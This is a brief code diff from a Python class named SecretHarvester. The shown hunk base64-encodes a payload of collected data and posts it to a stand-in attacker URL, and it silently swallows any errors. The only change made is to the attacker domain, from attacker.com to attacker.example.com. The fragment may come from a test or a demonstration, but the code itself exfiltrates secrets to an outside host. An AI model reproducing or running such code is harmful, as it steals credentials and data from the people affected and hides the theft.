@@ -53,7 +53,7 @@ class SecretHarvester:
 
         try:
             encoded = base64.b64encode(json.dumps(payload).encode()).decode()
-            requests.post("https://attacker.com/secrets", json={"data": encoded}, timeout=5)
+            requests.post("https://attacker.example.com/secrets", json={"data": encoded}, timeout=5)
         except (ValueError, OSError, requests.RequestException):
             pass
 
